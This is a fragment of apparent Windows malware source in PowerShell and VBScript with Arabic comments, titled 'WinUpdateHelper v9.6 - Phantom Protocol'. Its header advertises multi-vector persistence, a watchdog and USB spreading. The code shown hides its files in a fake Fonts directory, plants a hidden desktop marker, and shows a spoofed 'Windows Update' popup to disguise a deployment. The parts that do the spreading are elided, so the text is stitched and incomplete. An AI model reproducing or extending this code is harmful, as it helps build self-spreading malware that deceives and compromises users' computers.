# === WinUpdateHelper v9.6 - Phantom Protocol ===
# GitHub Auto-Deploy | Multi-Vector Persistence | Temp-Adaptive | Watchdog | USB Spreader
# CONFIRMATION SIGNATURES: Desktop Marker + One-Time Toast
...
# علامة تأكيدية أولى: ملف مخفي على الديسكتوب
$desktopMarker = "$env:USERPROFILE\Desktop\.sys_check"

# علامة تأكيدية ثانية: ملف وقت التشغيل الأول
$firstRunLog = Join-Path $fontDir ".first_run"
...
firstRunFile = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Fonts\.first_run"
desktopMarker = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\.sys_check"

' --- تأكيد أول تشغيل: كتابة ملف + Toast ---
Sub ConfirmFirstRun()
    If Not fso.FileExists(firstRunFile) Then
        ' كتابة توقيت التشغيل الأول
        Dim ts : ts = Now()
        fso.CreateTextFile(firstRunFile, True).Write("DEPLOYED: " & ts)
        
        ' كتابة علامة الديسكتوب
        On Error Resume Next
        fso.CreateTextFile(desktopMarker, True).Write("ok")
        On Error Goto 0
        
        ' إظهار رسالة تأكيد لمدة 5 ثواني (خفيفة، تظهر وتختفي)
        shell.Popup "System update completed.", 5, "Windows Update", 64
    End If
End Sub
